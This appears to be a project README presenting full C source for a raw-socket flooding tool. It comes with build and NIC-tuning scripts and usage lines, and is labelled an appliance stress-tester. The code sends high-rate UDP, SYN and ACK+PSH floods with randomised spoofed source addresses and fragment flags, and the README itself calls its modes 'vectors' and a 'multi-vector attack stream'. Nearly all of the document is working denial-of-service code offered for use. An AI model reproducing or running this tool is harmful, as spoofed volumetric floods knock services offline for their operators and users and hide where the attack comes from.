# </> SynFlood-L4

**High-Performance Layer 4 Synthetic Traffic Generator & Appliance Stress-Tester**

---

## 📄 Source Code (`flood.c`)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sched.h>
#include <errno.h>

volatile sig_atomic_t running = 1;
char target_ip[32];
int target_port;
char method[32];
atomic_ullong total_packets;
atomic_ullong total_bytes;

uint64_t global_rng_seed_state[4];

static inline uint64_t rotl(const uint64_t x, int k) {
    return (x << k) | (x >> (64 - k));
}

static _Thread_local uint64_t tl_rng_state[4];

static inline uint64_t xoshiro256starstar(void) {
    const uint64_t result = rotl(tl_rng_state[1] * 5, 7) * 9;
    const uint64_t t = tl_rng_state[1] << 17;
    tl_rng_state[2] ^= tl_rng_state[0];
    tl_rng_state[3] ^= tl_rng_state[1];
    tl_rng_state[1] ^= tl_rng_state[2];
    tl_rng_state[0] ^= tl_rng_state[3];
    tl_rng_state[2] ^= t;
    tl_rng_state[3] = rotl(tl_rng_state[3], 45);
    return result;
}

void init_global_rng(void) {
    FILE *f = fopen("/dev/urandom", "rb");
    if (f) {
        if (fread(global_rng_seed_state, sizeof(global_rng_seed_state), 1, f) != 1) {
            global_rng_seed_state[0] = time(NULL) ^ clock();
            global_rng_seed_state[1] = getpid() ^ getppid();
            global_rng_seed_state[2] = time(NULL) << 16;
            global_rng_seed_state[3] = 0xDEADBEEFCAFEBABE;
        }
        fclose(f);
    } else {
        global_rng_seed_state[0] = time(NULL) ^ clock();
        global_rng_seed_state[1] = getpid() ^ getppid();
        global_rng_seed_state[2] = time(NULL) << 16;
        global_rng_seed_state[3] = 0xDEADBEEFCAFEBABE;
    }
}

void init_thread_rng(void) {
    memcpy(tl_rng_state, global_rng_seed_state, sizeof(global_rng_seed_state));
    tl_rng_state[0] ^= (pthread_self() ^ sched_getcpu());
    for(int i = 0; i < 4; i++) xoshiro256starstar();
}

static inline uint32_t fast_rand(void) {
    return (uint32_t)xoshiro256starstar();
}

static inline uint32_t get_random_ip(void) {
    uint32_t ip = fast_rand();
    uint8_t b1 = (ip & 0xFF), b2 = ((ip >> 8) & 0xFF), b3 = ((ip >> 16) & 0xFF), b4 = ((ip >> 24) & 0xFF);
    if (b1 == 0) b1 = 1; if (b4 == 0) b4 = 1;
    if (b1 == 127) b1 = 128;
    return htonl((b4 << 24) | (b3 << 16) | (b2 << 8) | b1);
}

struct pseudo_header {
    uint32_t source_address;
    uint32_t destination_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
} __attribute__((packed));

static inline unsigned short csum_fast(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) sum += *(unsigned char*)ptr;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

static inline uint32_t murmur3_32(const uint8_t* key, uint32_t len, uint32_t seed) {
    uint32_t h = seed;
    uint32_t k;
    for (uint32_t i = len >> 2; i; i--) {
        memcpy(&k, key, sizeof(uint32_t));
        key += sizeof(uint32_t);
        h ^= k * 0xcc9e2d51;
        h = (h << 13) | (h >> 19);
        h = h * 5 + 0xe6546b64;
    }
    k = 0;
    for (uint32_t i = len & 3; i; i--) {
        k <<= 8;
        k |= key[i - 1];
    }
    h ^= k * 0xcc9e2d51;
    h ^= len;
    h ^= h >> 16;
    h *= 0x85ebca6b;
    h ^= h >> 13;
    h *= 0xc2b2ae35;
    h ^= h >> 16;
    return h;
}

#define POOL_SIZE 64
#define BATCH_SIZE 512
#define MAX_PAYLOAD 1472
#define CACHE_LINE 64

typedef struct {
    int sock;
    char datagrams[BATCH_SIZE][2048] __attribute__((aligned(CACHE_LINE)));
    struct sockaddr_in sins[BATCH_SIZE];
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];
    char payload_pool[POOL_SIZE][MAX_PAYLOAD] __attribute__((aligned(CACHE_LINE)));
    char pseudogram[2048] __attribute__((aligned(CACHE_LINE)));
    char padding[CACHE_LINE];
} thread_ctx_t;

void init_payload_pool(thread_ctx_t *ctx) {
    for (int p = 0; p < POOL_SIZE; p++) {
        uint32_t seed = fast_rand();
        uint32_t lfsr = fast_rand();
        for (int j = 0; j < MAX_PAYLOAD; j += 4) {
            lfsr = (lfsr >> 1) ^ (-(lfsr & 1u) & 0xB400u);
            uint32_t hash = murmur3_32((const uint8_t*)&lfsr, 4, seed + j);
            memcpy(ctx->payload_pool[p] + j, &hash, 4);
            seed ^= hash;
        }
    }
}

void *zerocopy_reaper(void *arg) {
    thread_ctx_t *ctx = (thread_ctx_t *)arg;
    struct msghdr err_msg = {0};
    char ctrl[1024] __attribute__((aligned(CACHE_LINE)));
    err_msg.msg_control = ctrl;
    err_msg.msg_controllen = sizeof(ctrl);

    while (running) {
        int ret = recvmsg(ctx->sock, &err_msg, MSG_ERRQUEUE | MSG_DONTWAIT);
        if (ret < 0) {
            if (errno == EAGAIN) {
                usleep(1); 
            }
            continue;
        }
        err_msg.msg_controllen = sizeof(ctrl);
    }
    return NULL;
}

void handle_signal(int sig) {
    (void)sig;
    running = 0;
}

void setup_socket(thread_ctx_t *ctx) {
    ctx->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (ctx->sock < 0) {
        if (errno == EPERM) fprintf(stderr, "Error: Raw socket requires root privileges. Run with sudo.\n");
        free(ctx);
        pthread_exit(NULL);
    }
    
    int one = 1;
    int buff_size = 8 * 1024 * 1024;
    int busy_poll = 50;
    setsockopt(ctx->sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    setsockopt(ctx->sock, SOL_SOCKET, SO_SNDBUF, &buff_size, sizeof(buff_size));
    setsockopt(ctx->sock, SOL_SOCKET, SO_ZEROCOPY, &one, sizeof(one));
    setsockopt(ctx->sock, SOL_SOCKET, SO_BUSY_POLL, &busy_poll, sizeof(busy_poll));
}

void prepare_udp(thread_ctx_t *ctx, struct sockaddr_in sin) {
    for (int i = 0; i < BATCH_SIZE; i++) {
        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
        struct udphdr *udph = (struct udphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
        memcpy(ctx->datagrams[i] + sizeof(struct iphdr) + sizeof(struct udphdr), ctx->payload_pool[i % POOL_SIZE], MAX_PAYLOAD);
        iph->ihl = 5; iph->version = 4;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD;
        iph->protocol = IPPROTO_UDP;
        iph->daddr = sin.sin_addr.s_addr;
        udph->dest = htons(target_port);
        udph->len = htons(sizeof(struct udphdr) + MAX_PAYLOAD);
        udph->check = 0;
        ctx->sins[i] = sin;
        ctx->iovecs[i].iov_base = ctx->datagrams[i];
        ctx->iovecs[i].iov_len = iph->tot_len;
        memset(&ctx->msgs[i], 0, sizeof(struct mmsghdr));
        ctx->msgs[i].msg_hdr.msg_name = &ctx->sins[i];
        ctx->msgs[i].msg_hdr.msg_namelen = sizeof(sin);
        ctx->msgs[i].msg_hdr.msg_iov = &ctx->iovecs[i];
        ctx->msgs[i].msg_hdr.msg_iovlen = 1;
    }
}

void prepare_syn(thread_ctx_t *ctx, struct sockaddr_in sin) {
    int tcp_opt_len = 16;
    for (int i = 0; i < BATCH_SIZE; i++) {
        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
        struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
        char *tcp_opts = ctx->datagrams[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);
        tcp_opts[0] = 2; tcp_opts[1] = 4; tcp_opts[2] = 0x05; tcp_opts[3] = 0xb4;
        tcp_opts[4] = 4; tcp_opts[5] = 2;
        tcp_opts[6] = 8; tcp_opts[7] = 10; tcp_opts[8] = 0; tcp_opts[9] = 0;
        *((uint16_t*)(tcp_opts + 10)) = htons(fast_rand() & 0xFFFF);
        *((uint16_t*)(tcp_opts + 12)) = 0;
        tcp_opts[14] = 1; tcp_opts[15] = 3; tcp_opts[16] = 3; tcp_opts[17] = 7;
        iph->ihl = 5; iph->version = 4;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_opt_len;
        iph->protocol = IPPROTO_TCP;
        iph->daddr = sin.sin_addr.s_addr;
        tcph->doff = (sizeof(struct tcphdr) + tcp_opt_len) / 4;
        tcph->dest = htons(target_port);
        tcph->syn = 1;
        tcph->window = htons(64240);
        ctx->sins[i] = sin;
        ctx->iovecs[i].iov_base = ctx->datagrams[i];
        ctx->iovecs[i].iov_len = iph->tot_len;
        memset(&ctx->msgs[i], 0, sizeof(struct mmsghdr));
        ctx->msgs[i].msg_hdr.msg_name = &ctx->sins[i];
        ctx->msgs[i].msg_hdr.msg_namelen = sizeof(sin);
        ctx->msgs[i].msg_hdr.msg_iov = &ctx->iovecs[i];
        ctx->msgs[i].msg_hdr.msg_iovlen = 1;
    }
}

void prepare_ack(thread_ctx_t *ctx, struct sockaddr_in sin) {
    int payload_len = 1024;
    for (int i = 0; i < BATCH_SIZE; i++) {
        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
        struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
        char *payload = ctx->datagrams[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);
        memcpy(payload, ctx->payload_pool[i % POOL_SIZE], payload_len);
        iph->ihl = 5; iph->version = 4;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
        iph->protocol = IPPROTO_TCP;
        iph->daddr = sin.sin_addr.s_addr;
        tcph->dest = htons(target_port);
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->psh = 1;
        tcph->window = htons(65535);
        ctx->sins[i] = sin;
        ctx->iovecs[i].iov_base = ctx->datagrams[i];
        ctx->iovecs[i].iov_len = iph->tot_len;
        memset(&ctx->msgs[i], 0, sizeof(struct mmsghdr));
        ctx->msgs[i].msg_hdr.msg_name = &ctx->sins[i];
        ctx->msgs[i].msg_hdr.msg_namelen = sizeof(sin);
        ctx->msgs[i].msg_hdr.msg_iov = &ctx->iovecs[i];
        ctx->msgs[i].msg_hdr.msg_iovlen = 1;
    }
}

void update_udp(thread_ctx_t *ctx) {
    for (int i = 0; i < BATCH_SIZE; i++) {
        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
        struct udphdr *udph = (struct udphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
        iph->saddr = get_random_ip();
        iph->id = htons(fast_rand() & 0xFFFF);
        iph->ttl = (fast_rand() % 128) + 32;
        iph->tos = fast_rand() & 0xFF;
        iph->frag_off = htons(0x2000 | (fast_rand() % 8191));
        iph->check = 0;
        iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
        udph->source = htons(fast_rand() % 64512 + 1024);
    }
}

void update_syn(thread_ctx_t *ctx, struct sockaddr_in sin) {
    int tcp_opt_len = 16;
    struct pseudo_header psh;
    psh.destination_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + tcp_opt_len);
    for (int i = 0; i < BATCH_SIZE; i++) {
        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
        struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
        iph->saddr = get_random_ip();
        iph->id = htons(fast_rand() & 0xFFFF);
        iph->ttl = (fast_rand() % 128) + 32;
        iph->tos = fast_rand() & 0xFF;
        iph->frag_off = htons(0x2000);
        iph->check = 0;
        iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
        tcph->source = htons(fast_rand() % 64512 + 1024);
        tcph->seq = htonl(fast_rand());
        tcph->check = 0;
        psh.source_address = iph->saddr;
        memcpy(ctx->pseudogram, &psh, sizeof(psh));
        memcpy(ctx->pseudogram + sizeof(psh), tcph, sizeof(struct tcphdr) + tcp_opt_len);
        tcph->check = csum_fast((unsigned short *)ctx->pseudogram, sizeof(psh) + sizeof(struct tcphdr) + tcp_opt_len);
    }
}

void update_ack(thread_ctx_t *ctx, struct sockaddr_in sin) {
    int payload_len = 1024;
    struct pseudo_header psh;
    psh.destination_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);
    for (int i = 0; i < BATCH_SIZE; i++) {
        struct iphdr *iph = (struct iphdr *)ctx->datagrams[i];
        struct tcphdr *tcph = (struct tcphdr *)(ctx->datagrams[i] + sizeof(struct iphdr));
        iph->saddr = get_random_ip();
        iph->id = htons(fast_rand() & 0xFFFF);
        iph->ttl = (fast_rand() % 64) + 64;
        iph->frag_off = htons(fast_rand() & 0x1FFF);
        iph->check = 0;
        iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
        tcph->source = htons(fast_rand() % 64512 + 1024);
        tcph->seq = htonl(fast_rand());
        tcph->ack_seq = htonl(fast_rand());
        tcph->check = 0;
        psh.source_address = iph->saddr;
        memcpy(ctx->pseudogram, &psh, sizeof(psh));
        memcpy(ctx->pseudogram + sizeof(psh), tcph, sizeof(struct tcphdr) + payload_len);
        tcph->check = csum_fast((unsigned short *)ctx->pseudogram, sizeof(psh) + sizeof(struct tcphdr) + payload_len);
    }
}

void *flood_thread(void *arg) {
    int cpu_id = *(int *)arg;
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    init_thread_rng();

    thread_ctx_t *ctx = (thread_ctx_t *)malloc(sizeof(thread_ctx_t));
    if (!ctx) return NULL;
    memset(ctx, 0, sizeof(thread_ctx_t));
    init_payload_pool(ctx);
    setup_socket(ctx);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    pthread_t reaper_th;
    pthread_create(&reaper_th, NULL, zerocopy_reaper, ctx);

    int current_mode = -1;

    while (running) {
        int chosen_mode;
        if (strcmp(method, "mix") == 0) {
            chosen_mode = fast_rand() % 3;
        } else if (strcmp(method, "udp") == 0) {
            chosen_mode = 0;
        } else if (strcmp(method, "syn") == 0) {
            chosen_mode = 1;
        } else {
            chosen_mode = 2;
        }

        if (chosen_mode != current_mode) {
            if (chosen_mode == 0) prepare_udp(ctx, sin);
            else if (chosen_mode == 1) prepare_syn(ctx, sin);
            else prepare_ack(ctx, sin);
            current_mode = chosen_mode;
        }

        if (current_mode == 0) update_udp(ctx);
        else if (current_mode == 1) update_syn(ctx, sin);
        else update_ack(ctx, sin);

        sendmmsg(ctx->sock, ctx->msgs, BATCH_SIZE, MSG_DONTWAIT | MSG_ZEROCOPY);
        atomic_fetch_add(&total_packets, BATCH_SIZE);
        atomic_fetch_add(&total_bytes, BATCH_SIZE * ctx->iovecs[0].iov_len);
    }

    pthread_cancel(reaper_th);
    pthread_join(reaper_th, NULL);
    close(ctx->sock);
    free(ctx);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <ip> <port> <method>\nMethods: udp | syn | ack | mix\n", argv[0]);
        exit(1);
    }

    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    target_port = atoi(argv[2]);
    strncpy(method, argv[3], sizeof(method) - 1);

    int auto_threads = sysconf(_SC_NPROCESSORS_ONLN) * 2;
    if (auto_threads < 4) auto_threads = 8;

    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    init_global_rng();
    signal(SIGINT, handle_signal);

    pthread_t *th = (pthread_t *)malloc(auto_threads * sizeof(pthread_t));
    int *cpu_ids = (int *)malloc(auto_threads * sizeof(int));

    for (int i = 0; i < auto_threads; i++) {
        cpu_ids[i] = i % sysconf(_SC_NPROCESSORS_ONLN);
        pthread_create(&th[i], NULL, flood_thread, &cpu_ids[i]);
    }

    while (running) pause();

    for (int i = 0; i < auto_threads; i++) {
        pthread_cancel(th[i]);
        pthread_join(th[i], NULL);
    }

    free(th);
    free(cpu_ids);
    return 0;
}

```

---

## 🛠️ Compilation & System Tuning

### Build Command

```bash
gcc -O3 -march=native -funroll-all-loops -o flood flood.c -lpthread

```

### Tuning Script (`tune.sh`)

```bash
#!/usr/bin/env bash
set -e

INTERFACE="eth0"

echo "[+] Optimizing Kernel Buffers..."
sysctl -w net.core.wmem_max=16777216
sysctl -w net.core.wmem_default=16777216

echo "[+] Maximizing NIC Ring Buffers & TX Queue Length..."
ethtool -G "$INTERFACE" tx 4096 rx 4096 2>/dev/null || true
ip link set "$INTERFACE" txqueuelen 10000

echo "[+] Enabling Hardware Offloads..."
ethtool -K "$INTERFACE" tso on gso on ufo on 2>/dev/null || true

echo "[+] Tuning Interrupt Moderation & NAPI Polling..."
ethtool -C "$INTERFACE" adaptive-tx off tx-usecs 10 tx-frames 32 2>/dev/null || true
echo 2 > /sys/class/net/"$INTERFACE"/napi_defer_hard_irqs 2>/dev/null || true
echo 200000 > /sys/class/net/"$INTERFACE"/gro_flush_timeout 2>/dev/null || true

echo "[✓] System Tuning Complete!"

```

---

## 💻 Usage

```bash
sudo ./flood <target_ip> <target_port> <method>

```

### Available Vectors

* **`udp`**: Max-bandwidth UDP stream with randomized payloads.
* **`syn`**: TCP SYN flood with TFO options.
* **`ack`**: TCP ACK+PSH flood with fragmented headers.
* **`mix`**: Dynamic multi-vector attack stream.

### Example

```bash
sudo ./flood 192.168.1.100 80 mix

```

```

```
